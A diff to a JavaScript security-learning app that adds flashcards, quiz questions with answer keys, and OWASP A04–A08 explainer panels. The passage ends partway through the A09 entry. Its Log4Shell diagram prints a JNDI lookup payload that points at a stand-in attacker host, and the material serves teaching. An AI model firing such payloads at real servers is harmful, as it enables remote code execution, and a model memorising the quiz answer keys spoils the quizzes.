@@ -45,6 +45,22 @@ document.addEventListener('DOMContentLoaded', () => {
     { term: "OCSP", answer: "Online Certificate Status Protocol. A protocol for checking certificate revocation status in real-time." },
     { term: "CRL", answer: "Certificate Revocation List. A list of certificates that have been revoked before their expiration date." },
 
+    // SECTION 4 — PKI (add)
+    { term: "Certificate chain", answer: "Root CA → Intermediate CA → Leaf certificate. The browser verifies each signature up to a trusted root." },
+    { term: "Certificate Transparency", answer: "A public logging system for certificates. Detects mis-issuance by making all certificates publicly auditable." },
+    { term: "ACME protocol", answer: "Automatic Certificate Management Environment. Used by Let's Encrypt to automate certificate issuance and renewal." },
+    { term: "PEM vs DER", answer: "PEM is Base64-encoded text; DER is binary. Both are certificate formats. PKCS#12 bundles certificate + private key." },
+
+    // SECTION 7 — OWASP Part 1 (add)
+    { term: "A01: Broken Access Control", answer: "The #1 OWASP risk. Fails to enforce what an authenticated user is allowed to do. Includes IDOR and privilege escalation." },
+    { term: "A02: Cryptographic Failures", answer: "Weak encryption, missing TLS, hardcoded keys, or bad password hashing. Directly connects to Sections 1-3." },
+    { term: "A03: Injection", answer: "SQL injection, command injection, LDAP injection. Occurs when untrusted input is concatenated into executable syntax." },
+
+    // SECTION 8 — OWASP Part 2 (add)
+    { term: "A06: Vulnerable and Outdated Components", answer: "Using libraries with known CVEs. Log4Shell (2021) demonstrated the scale of this risk." },
+    { term: "A07: Identification and Authentication Failures", answer: "Weak passwords, no rate limiting, exposed session IDs, or session tokens not invalidated after logout." },
+    { term: "A08: Software and Data Integrity Failures", answer: "Supply chain attacks — trusting updates without verifying integrity. SolarWinds (2020) was a real-world example." },
+
     // SECTION 5 — AuthN vs AuthZ
     { term: "Authentication (AuthN)", answer: "Verifying who you are. Identity verification. Example: logging in with a password." },
     { term: "Authorization (AuthZ)", answer: "Determining what you can do. Permissions. Example: access control lists (ACLs)." },
@@ -52,6 +68,10 @@ document.addEventListener('DOMContentLoaded', () => {
     { term: "OAuth 2.0", answer: "An authorization framework that allows third-party applications to access user data without sharing passwords." },
     { term: "OpenID Connect", answer: "An authentication layer built on top of OAuth 2.0. Provides identity verification." },
 
+    // SECTION 6 — Least Privilege (add)
+    { term: "Separation of Duties (SoD)", answer: "Ensures no single person can perform critical actions alone. Requires multiple approvals for sensitive operations." },
+    { term: "Privilege escalation", answer: "An attack where a low-privilege user exploits a vulnerability to gain higher privileges (e.g., admin). Least privilege reduces the risk." },
+    { term: "Service account rotation", answer: "Regularly rotating credentials for automated service accounts. Short-lived credentials reduce the impact of compromise." },
     // SECTION 6 — Least Privilege
     { term: "Least privilege", answer: "Grant only the minimum permissions necessary to perform a task. Reduces the blast radius of a breach." },
     { term: "Role-based Access Control", answer: "Access control based on job roles. Users are assigned roles, and roles have permissions." },
@@ -65,6 +85,14 @@ document.addEventListener('DOMContentLoaded', () => {
     { term: "Broken Authentication", answer: "Authentication vulnerabilities like credential stuffing, session fixation, and weak password policies. Mitigated by MFA and strong session management." },
     { term: "Insecure Direct Object References", answer: "An access control vulnerability where unvalidated user input is used to directly access resources. Mitigated by indirect reference maps and access control checks." },
 
+    // SECTION 9 — Hardening (add)
+    { term: "CIS Benchmarks", answer: "Industry-standard hardening checklists published by the Center for Internet Security. Level 1 (basic) and Level 2 (advanced)." },
+    { term: "AppArmor / SELinux", answer: "Mandatory Access Control (MAC) systems. Constrain what programs can do even if compromised, unlike normal file permissions (DAC)." },
+    { term: "fail2ban", answer: "A tool that monitors logs for failed login attempts and temporarily bans source IPs. Protects against brute-force attacks." },
+    { term: "auditd", answer: "Linux kernel-level auditing. Logs system calls, file access, and command executions. Essential for incident response and compliance." },
+    { term: "Systemd hardening", answer: "Directives like ProtectSystem, PrivateTmp, NoNewPrivileges. Sandbox services at the OS level. Protects even if the service is compromised." },
+    { term: "ASLR (Address Space Layout Randomization)", answer: "Randomizes memory addresses where programs load. Makes memory corruption exploits harder by making addresses unpredictable." },
+    { term: "NX bit (No-eXecute)", answer: "Marks data regions as non-executable. Prevents buffer overflow attacks from executing injected code in memory." },
     // SECTION 8 — OWASP Top 10 (Part 2)
     { term: "Security Misconfiguration", answer: "Insecure default configurations, incomplete configurations, or exposed error details. Mitigated by secure defaults and automated configuration scanning." },
     { term: "Insecure Deserialization", answer: "Exploiting insecure deserialisation of data. Can lead to remote code execution. Mitigated by not accepting serialised data from untrusted sources." },
@@ -192,7 +220,18 @@ document.addEventListener('DOMContentLoaded', () => {
       { q: "What is encryption at rest?", options: ["Encrypting stored data", "Encrypting data in transit", "Encrypting passwords", "Encrypting logs"], correct: 0, explain: "Encryption at rest protects data stored on disk or in databases. Encryption in transit protects data moving across networks." },
       { q: "What is PKI?", options: ["Public Key Infrastructure", "Private Key Integration", "Public Key Interface", "Private Key Infrastructure"], correct: 0, explain: "PKI is the framework for managing public-key encryption and digital certificates, enabling secure communications." },
       { q: "What is a salt in password hashing?", options: ["Random data added to the password before hashing", "A type of encryption", "A password manager", "A hash algorithm"], correct: 0, explain: "A salt is a random value added to a password before hashing, preventing rainbow table attacks." },
-      { q: "What is the main purpose of a firewall?", options: ["Control network traffic based on rules", "Encrypt data", "Store passwords", "Manage users"], correct: 0, explain: "A firewall filters network traffic based on predefined rules, blocking or allowing connections." }
+      { q: "What is the main purpose of a firewall?", options: ["Control network traffic based on rules", "Encrypt data", "Store passwords", "Manage users"], correct: 0, explain: "A firewall filters network traffic based on predefined rules, blocking or allowing connections." },
+      // Additional Set 1 questions — Core Concepts
+      { q: "What is a hybrid cryptosystem?", options: ["Uses asymmetric to exchange a symmetric session key, then symmetric for bulk data", "Uses only asymmetric encryption", "Uses only symmetric encryption", "Doesn't use encryption at all"], correct: 0, explain: "Hybrid cryptosystems use asymmetric encryption to securely exchange a symmetric session key, then use symmetric encryption for bulk data — exactly how TLS, SSH, and VPNs work." },
+      { q: "What is the key exchange problem?", options: ["How to agree on a secret key over an insecure channel without the eavesdropper learning it", "How to exchange public keys", "How to store encryption keys", "How to rotate keys"], correct: 0, explain: "The key exchange problem is the fundamental challenge of agreeing on a shared secret key over an insecure network without the attacker also learning it. Asymmetric encryption solves this." },
+      { q: "What is the recommended minimum salt length in password hashing?", options: ["8 bytes", "16 bytes (128 bits)", "32 bytes", "64 bytes"], correct: 1, explain: "OWASP recommends a minimum of 16 bytes (128 bits) for salts. Modern systems use 32 bytes (256 bits)." },
+      { q: "What is the most recommended password hashing algorithm?", options: ["MD5", "SHA-256", "Argon2id", "bcrypt"], correct: 2, explain: "Argon2id is the modern recommendation (2015 winner of the Password Hashing Competition). bcrypt is also good, but Argon2id is the current best practice." },
+      { q: "What is Zero Trust?", options: ["Never trust by default; always verify every request", "Trust everything inside the corporate network", "Only trust authenticated users", "A type of encryption"], correct: 0, explain: "Zero Trust assumes no implicit trust — every request from anywhere is authenticated and authorized every time, regardless of network location." },
+      { q: "What is A01: Broken Access Control?", options: ["Failing to properly enforce what an authenticated user is allowed to do", "Weak encryption", "SQL injection", "Missing TLS"], correct: 0, explain: "Broken Access Control (the #1 OWASP risk) occurs when the system checks authentication but not authorization — exactly the IDOR/BOLA pattern from Section 5." },
+      { q: "What is the primary goal of the principle of least privilege?", options: ["Limit the blast radius of a breach", "Prevent all breaches", "Encrypt all data", "Block all network traffic"], correct: 0, explain: "Least privilege doesn't prevent breaches — it limits the blast radius once one happens. The account gets compromised either way; the difference is how much damage it can cause." },
+      { q: "What is a Certificate Transparency log?", options: ["A public log of all issued certificates", "A certificate revocation list", "A private CA database", "A TLS handshake log"], correct: 0, explain: "Certificate Transparency publicly logs all issued certificates, making it possible to detect fraudulent or mis-issued certificates." },
+      { q: "What is an SBOM?", options: ["Software Bill of Materials — a list of all components in a software product", "A security policy document", "A backup file", "A type of encryption"], correct: 0, explain: "An SBOM (Software Bill of Materials) is a formal list of all components, libraries, and dependencies used in a software product — critical for vulnerability tracking and supply chain security." },
+      { q: "What is Defence in Depth?", options: ["Multiple layers of security controls", "A single strong control", "Only perimeter security", "No security controls"], correct: 0, explain: "Defence in Depth uses multiple layers of security controls so that if one layer fails, others are still in place — e.g., firewall + WAF + application-level controls." }
     ],
     2: [
       { q: "What is SQL injection?", options: ["Inserting malicious SQL code into a query", "A network-based attack", "A physical security breach", "A type of encryption"], correct: 0, explain: "SQL injection is an attack where malicious SQL statements are inserted into an input field, manipulating the database." },
@@ -204,9 +243,31 @@ document.addEventListener('DOMContentLoaded', () => {
       { q: "What is HSTS?", options: ["Forces browsers to always use HTTPS", "A type of encryption", "A hash algorithm", "A firewall rule"], correct: 0, explain: "HSTS (HTTP Strict Transport Security) forces browsers to always use HTTPS for a domain." },
       { q: "What is a pepper in password security?", options: ["A global secret stored outside the database", "A per-user random value", "A type of hash function", "A salt replacement"], correct: 0, explain: "A pepper is a global secret key stored separately from the database, adding an extra layer of defence if the database is breached." },
       { q: "What is SNI?", options: ["Tells the server which domain the client is connecting to", "A certificate authority", "A hash algorithm", "A firewall rule"], correct: 0, explain: "SNI (Server Name Indication) lets the client tell the server which domain it's connecting to during the TLS handshake." },
-      { q: "What is 0-RTT in TLS 1.3?", options: ["Sending data immediately without waiting for the handshake", "A type of certificate", "A hash function", "A firewall rule"], correct: 0, explain: "0-RTT in TLS 1.3 allows returning clients to send data immediately without waiting for the handshake to complete." }
+      { q: "What is 0-RTT in TLS 1.3?", options: ["Sending data immediately without waiting for the handshake", "A type of certificate", "A hash function", "A firewall rule"], correct: 0, explain: "0-RTT in TLS 1.3 allows returning clients to send data immediately without waiting for the handshake to complete." },
+      // Additional Set 2 questions — Attacks & Defenses
+      { q: "What is A02: Cryptographic Failures?", options: ["Weak encryption, missing TLS, hardcoded keys", "SQL injection", "Cross-site scripting", "Broken access control"], correct: 0, explain: "Cryptographic Failures cover weak ciphers, missing TLS, bad password hashing, and hardcoded keys — connecting directly to Sections 1-3." },
+      { q: "What is A06: Vulnerable and Outdated Components?", options: ["Using libraries with known CVEs", "Weak passwords", "Missing TLS", "Broken access control"], correct: 0, explain: "A06 covers using dependencies with known vulnerabilities. Log4Shell (2021) is a famous example of the scale of this risk." },
+      { q: "What is A07: Identification and Authentication Failures?", options: ["Weak session management, no rate limiting", "SQL injection", "XSS", "Hardcoded keys"], correct: 0, explain: "A07 covers weak passwords, no rate limiting on login attempts, exposed session IDs, and sessions not invalidated after logout." },
+      { q: "What is A08: Software and Data Integrity Failures?", options: ["Supply chain attacks, unsigned updates", "SQL injection", "XSS", "Broken access control"], correct: 0, explain: "A08 covers trusting code, updates, or data without verifying integrity. SolarWinds (2020) is a real-world example." },
+      { q: "What is A10: Server-Side Request Forgery (SSRF)?", options: ["Server makes requests to internal resources based on user input", "SQL injection", "Cross-site scripting", "Broken access control"], correct: 0, explain: "SSRF occurs when an application fetches a URL from user input without validation, allowing the server to reach internal systems that the attacker couldn't directly access." },
+      { q: "What is A04: Insecure Design?", options: ["Architecture-level flaws, not coding bugs", "SQL injection", "Weak passwords", "Missing TLS"], correct: 0, explain: "Insecure Design is an architecture-level flaw baked into the design before code is even written. Threat modeling during design is the countermeasure." },
+      { q: "What is command injection?", options: ["Injecting commands into a shell via user input", "SQL injection", "Cross-site scripting", "Broken access control"], correct: 0, explain: "Command injection occurs when user input is concatenated directly into a shell command, allowing an attacker to execute arbitrary system commands." },
+      { q: "What is A05: Security Misconfiguration?", options: ["Insecure defaults, open ports, exposed error messages", "SQL injection", "XSS", "Weak encryption"], correct: 0, explain: "A05 is one of the highest-volume findings in security audits — security features that exist but were never turned on or were left at insecure defaults." },
+      { q: "What is a hardcoded credential?", options: ["A secret key or password stored directly in source code", "An encrypted password", "A hashed password", "A certificate"], correct: 0, explain: "Hardcoded credentials are secrets stored directly in source code. The Uber 2016 breach was caused by hardcoded AWS keys in a private GitHub repository." },
+      { q: "What is the primary defence against SQL injection?", options: ["Parameterized queries (prepared statements)", "Firewalls", "Encryption", "Two-factor authentication"], correct: 0, explain: "Parameterized queries separate SQL logic from data, treating user input strictly as data, never as executable syntax." }
     ],
     3: [
+      // Additional Set 3 questions — Advanced Topics
+      { q: "What does ProtectSystem do in systemd?", options: ["Makes the filesystem read-only for the service", "Encrypts the service's data", "Disables network access", "Logs all system calls"], correct: 0, explain: "ProtectSystem mounts the filesystem read-only for the service — even if the service is compromised, the attacker can't modify system files." },
+      { q: "What does ASLR (Address Space Layout Randomization) do?", options: ["Randomizes memory addresses where programs load", "Encrypts all data in memory", "Blocks network connections", "Logs all system calls"], correct: 0, explain: "ASLR randomizes memory addresses, making memory-corruption exploits harder by making addresses unpredictable to attackers." },
+      { q: "What is fail2ban?", options: ["A tool that bans IPs after repeated failed login attempts", "A firewall", "An encryption tool", "A certificate authority"], correct: 0, explain: "fail2ban monitors logs for failed login attempts and temporarily bans source IPs — a practical defence against brute-force attacks." },
+      { q: "What does auditd do?", options: ["Logs system calls, file access, and command executions", "Encrypts system logs", "Blocks network traffic", "Manages certificates"], correct: 0, explain: "auditd is the Linux kernel's auditing subsystem — it logs security-relevant events at the OS level, essential for incident response and compliance." },
+      { q: "What is ACME protocol?", options: ["Automated certificate issuance and renewal", "A type of encryption", "A firewall rule", "A hash algorithm"], correct: 0, explain: "ACME (Automatic Certificate Management Environment) is used by Let's Encrypt to automate certificate issuance and renewal." },
+      { q: "What is the NX bit?", options: ["Marks data regions as non-executable", "Encrypts memory", "Randomizes memory addresses", "Blocks network connections"], correct: 0, explain: "The NX bit (No-eXecute) marks data regions as non-executable, preventing buffer overflow attacks from executing injected code in memory." },
+      { q: "What are CIS Benchmarks?", options: ["Industry-standard hardening checklists", "Encryption standards", "Firewall rules", "Certificate authorities"], correct: 0, explain: "CIS Benchmarks are vetted, numbered, auditable hardening checklists published by the Center for Internet Security — turning judgement calls into scorable items." },
+      { q: "What is AppArmor?", options: ["A Mandatory Access Control (MAC) system for Ubuntu", "A firewall", "An encryption tool", "A certificate authority"], correct: 0, explain: "AppArmor is Ubuntu's default MAC system — it confines programs to a defined profile of allowed files, capabilities, and network access." },
+      { q: "What is the main difference between DAC and MAC?", options: ["DAC lets the owner decide; MAC is a system-wide policy that even the owner can't override", "DAC is more secure than MAC", "MAC is only for files; DAC is for processes", "They are the same"], correct: 0, explain: "DAC (Discretionary Access Control) lets the resource owner decide who gets access. MAC (Mandatory Access Control) is a system-wide policy that constrains even the owner and root." },
+      { q: "What is the SLSA framework?", options: ["A supply chain security framework", "A type of encryption", "A firewall rule", "A certificate authority"], correct: 0, explain: "SLSA (Supply-chain Levels for Software Artifacts) is an industry framework formalizing defenses against build pipeline compromise — inspired by the SolarWinds attack." },
       { q: "What is the difference between encryption and hashing?", options: ["Encryption is reversible; hashing is not", "Hashing is reversible; encryption is not", "They are the same", "Encryption uses one key; hashing uses two"], correct: 0, explain: "Encryption is designed to be reversible with the right key. Hashing is one-way by design." },
       { q: "What is the main advantage of ECC over RSA?", options: ["Smaller key sizes for equivalent security", "Faster symmetric encryption", "No key exchange problem", "More secure than AES"], correct: 0, explain: "ECC uses much smaller keys than RSA for the same level of security, making it faster and more efficient." },
       { q: "What is the TLS handshake used for?", options: ["Establishing a secure connection", "Hashing passwords", "Storing certificates", "Generating symmetric keys"], correct: 0, explain: "The TLS handshake negotiates encryption parameters, authenticates the server, and establishes a shared symmetric session key." },
@@ -3673,6 +3734,1088 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   ];
 
+  const SECTION_8_ACCORDIONS = [
+    {
+      id: 's8-a04-insecure-design',
+      title: '8.1 A04: Insecure Design',
+      priority: false,
+      icon: '🏗️',
+      bodyHTML: `
+        <p>This category is different from the rest — it's not about a specific coding bug, but about a flaw baked into the <em>architecture</em> before any code was even written. A perfectly implemented, bug-free feature can still be insecure if the underlying design never accounted for abuse in the first place.</p>
+        <p><strong>Concrete example:</strong> a password reset flow that sends a 4-digit numeric code via SMS, with no rate limiting on how many times a code can be guessed. There's no coding "bug" here — every line works exactly as written. But the <em>design</em> allows an attacker to simply try all 10,000 possible codes in a short window (a trivial brute-force, since 4 digits = only 10,000 combinations) and take over any account. The fix isn't "patch a bug" — it's redesigning the flow itself: longer codes, rate limiting, account lockouts after repeated failures, and code expiry.</p>
+        <p>Insecure design is why <strong>threat modeling</strong> — deliberately asking "how could this be abused?" before building a feature — matters as much as writing secure code afterward.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Implementation Bug vs Design Flaw</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                Implementation Bug vs Design Flaw               │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Implementation Bug                                      │   │
+    │  │                                                          │   │
+    │  │  Code has a bug                                         │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Fix: patch the code                                    │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ✅ Vulnerability fixed                                  │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Design Flaw (A04)                                       │   │
+    │  │                                                          │   │
+    │  │  The feature's design is flawed                         │   │
+    │  │  (e.g., 4-digit reset code, no rate limit)              │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Fix: redesign the feature                              │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ✅ Vulnerability fixed                                  │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's8-a05-misconfiguration',
+      title: '8.2 A05: Security Misconfiguration',
+      priority: false,
+      icon: '⚙️',
+      bodyHTML: `
+        <p>This is exactly what it sounds like: security features exist and work correctly, but were never turned on, or were left at insecure defaults.</p>
+        <p><strong>Concrete examples:</strong></p>
+        <ul style="padding-left:1.2rem;margin:0.5rem 0;">
+          <li>A cloud storage bucket (AWS S3) left with public read access because the default "block public access" setting was manually disabled and never re-enabled</li>
+          <li>A database left accessible on its default port with default admin credentials (<code>admin</code>/<code>admin</code>) never changed</li>
+          <li>Verbose error messages in production revealing internal stack traces, file paths, or database schema</li>
+          <li>Unnecessary features/services left enabled (an admin API left running on a production server nobody remembered to disable after testing)</li>
+        </ul>
+        <p>This category is consistently one of the highest-volume real-world findings in security audits — not because it's technically sophisticated, but because it's tedious to get every configuration right across every environment, and easy to forget one setting.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Misconfiguration — Default vs Hardened</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │              Default vs Hardened Configuration                  │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Default / Misconfigured                                  │   │
+    │  │                                                          │   │
+    │  │  S3 bucket created                                      │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Public access left enabled                             │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ❌ Anyone on the internet can read/list objects         │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Properly Configured                                     │   │
+    │  │                                                          │   │
+    │  │  S3 bucket created                                      │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Public access explicitly blocked                       │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ✅ Only authorized IAM roles can access                │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's8-a06-vulnerable-components',
+      title: '8.3 A06: Vulnerable and Outdated Components',
+      priority: false,
+      icon: '📦',
+      bodyHTML: `
+        <p>Modern applications are built on dozens or hundreds of third-party libraries and frameworks. If any one of those has a known, publicly disclosed vulnerability and isn't updated, the application inherits that vulnerability — even if every line of the application's own code is perfectly secure.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">What is a CVE?</h4>
+        <p><strong>CVE</strong> (Common Vulnerabilities and Exposures) is a dictionary of publicly disclosed cybersecurity vulnerabilities. Each CVE has a unique identifier (e.g., CVE-2021-44228) and a public description. When a vulnerability in a popular library is disclosed with a CVE, it becomes trivial for attackers to scan the internet for applications still running the vulnerable version — the disclosure itself becomes the attack roadmap.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Dependency Vulnerability Cascade</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                    Dependency Vulnerability Cascade             │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Your Application                                        │   │
+    │  └────────────────────┬────────────────────────────────────┘   │
+    │                       │                                        │
+    │                       ▼                                        │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Uses Library A v1.0                                    │   │
+    │  └────────────────────┬────────────────────────────────────┘   │
+    │                       │                                        │
+    │                       ▼                                        │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Depends on Library B v2.3                              │   │
+    │  └────────────────────┬────────────────────────────────────┘   │
+    │                       │                                        │
+    │                       ▼                                        │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Depends on Library C v4.1                             │   │
+    │  │  ⚠️ VULNERABLE — CVE-2024-12345                        │   │
+    │  └────────────────────┬────────────────────────────────────┘   │
+    │                       │                                        │
+    │                       ▼                                        │
+    │  ❌ Your application is vulnerable                            │
+    │     (even though you never used Library C directly!)         │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+        <p><strong>Concrete example — Log4Shell (2021):</strong> a critical remote code execution vulnerability was found in Log4j, an extremely widely-used Java logging library — present, often invisibly, in a huge fraction of enterprise Java applications worldwide. A single log line containing a specially crafted string could let an attacker execute arbitrary code on the server, remotely, with no authentication required. Because Log4j was buried so deep inside so many dependency chains, many organizations didn't even know they were affected until they went looking specifically.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Log4Shell Attack Flow</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                    Log4Shell Attack Flow                        │
+    │                                                                 │
+    │    Attacker sends crafted string:                              │
+    │    \${jndi:ldap://attacker.com/a}                              │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    Log4j parses and resolves JNDI lookup                       │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    Server connects to attacker's LDAP server                   │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    Attacker's server returns malicious Java class              │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    ❌ Server executes remote code                              │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's8-a07-auth-failures',
+      title: '8.4 A07: Identification and Authentication Failures',
+      priority: false,
+      icon: '🔑',
+      bodyHTML: `
+        <p>This category extends Section 5's authentication concepts into specific failure patterns that show up constantly in practice.</p>
+        <p><strong>Concrete examples:</strong></p>
+        <ul style="padding-left:1.2rem;margin:0.5rem 0;">
+          <li>Allowing weak passwords with no minimum complexity or length requirements</li>
+          <li>No protection against brute-force login attempts (no rate limiting, no account lockout after repeated failures)</li>
+          <li>Exposing session IDs in URLs instead of secure cookies</li>
+          <li>Not invalidating session IDs after logout</li>
+        </ul>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Weak vs Strong Authentication Flow</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                Weak vs Strong Authentication                    │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Weak Authentication                                     │   │
+    │  │                                                          │   │
+    │  │  No password requirements                               │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  No rate limiting                                       │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Attacker brute-forces thousands of passwords          │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ❌ Account compromised                                 │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Strong Authentication                                   │   │
+    │  │                                                          │   │
+    │  │  Strong password policy                                 │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Rate limiting on login attempts                        │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Account lockout after failures                         │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ✅ Brute-force attack fails                            │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's8-a08-integrity',
+      title: '8.5 A08: Software and Data Integrity Failures',
+      priority: false,
+      icon: '🔗',
+      bodyHTML: `
+        <p>This covers assumptions of trust that turn out to be misplaced — trusting that code, updates, or data haven't been tampered with, without actually verifying it.</p>
+        <p><strong>Concrete example — supply chain attacks:</strong> if a CI/CD pipeline pulls dependencies from a package registry without verifying cryptographic signatures or checksums, an attacker who compromises that registry (or publishes a malicious package with a similar name to a popular one — "typosquatting") can inject malicious code directly into the build, which then gets deployed to production trusted implicitly.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Supply Chain Attack Flow</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                    Supply Chain Attack Flow                     │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  The Attack                                               │   │
+    │  │                                                          │   │
+    │  │  Attacker compromises build pipeline                    │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Injects malicious code into legitimate update          │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Update signed with legitimate certificate              │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Organizations trust and install the update             │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ❌ Malicious code runs in thousands of environments    │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Defence: Verify Integrity                               │   │
+    │  │                                                          │   │
+    │  │  Build pipeline produces artifact                       │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Artifact is signed/hashed                              │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Consumers verify signature/hash before installation    │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ✅ Only trusted code is executed                       │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+        <p><strong>Real-world example — SolarWinds (2020):</strong> attackers compromised SolarWinds' build pipeline itself and inserted malicious code into a legitimate, digitally-signed software update. Because the update was signed with SolarWinds' own legitimate certificate, it was trusted and installed by thousands of organizations — including US government agencies — without any red flags being raised. The trust in the signing process was real; the problem was that the build pipeline producing what got signed had already been compromised upstream.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">SBOM — Software Bill of Materials</h4>
+        <p>An <strong>SBOM</strong> (Software Bill of Materials) is a formal list of all components, libraries, and dependencies used in a software product. It's a critical defence against A06 and A08:</p>
+        <div class="table-wrapper">
+          <table class="data-table">
+            <thead><tr><th>SBOM Feature</th><th>How it helps</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Component inventory</strong></td><td>Know exactly what's in your application (defence against unknown dependencies)</td></tr>
+              <tr><td><strong>Version tracking</strong></td><td>Know which versions are vulnerable when a CVE is disclosed</td></tr>
+              <tr><td><strong>Provenance tracking</strong></td><td>Know where each component came from</td></tr>
+              <tr><td><strong>Integrity verification</strong></td><td>Verify components haven't been tampered with</td></tr>
+            </tbody>
+          </table>
+        </div>
+      `
+    },
+    {
+      id: 's8-a09-monitoring',
+      title: '8.6 A09: Security Logging and Monitoring Failures',
+      priority: false,
+      icon: '📊',
+      bodyHTML: `
